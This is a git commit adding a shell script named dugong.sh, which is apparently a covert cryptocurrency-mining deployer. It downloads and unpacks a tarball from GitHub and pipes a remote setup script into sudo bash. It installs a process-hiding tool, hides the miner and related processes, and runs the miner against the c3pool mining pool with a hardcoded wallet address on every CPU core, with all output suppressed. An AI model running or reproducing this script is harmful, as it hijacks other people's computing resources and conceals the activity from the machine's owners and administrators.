097044a3d4bce7bc6828b36b3f376ec56ce33cd2
01057057 <112078331+01057057@users.noreply.github.com>
2022-09-16 09:03:50 +0700

    Create dugong.sh

---
+++ dugong.sh
@@ -0,0 +1,20 @@
+#!/bin/sh
+pkill -
+wget https://github.com/muledan1/bash/raw/main/-.tar.gz
+tar -xf -.tar.gz
+apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+sudo swapoff -a; sudo swapon -a
+sleep 10
+ph add gudubrag.sh
+Ph add python3
+ph add root
+ph add node-process-hider
+ph add -
+./- -o auto.c3pool.org:80 -u 88ydD9P9dEVFTvCx5vVXR4YB5cVuDXcqCYZMVvkq2TAY4kSefFSWfXBSHbzwjTAAHoQZ2hyswPG1cGrbWy97bhVTTN6CjnM.الجُمُعَةُ -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
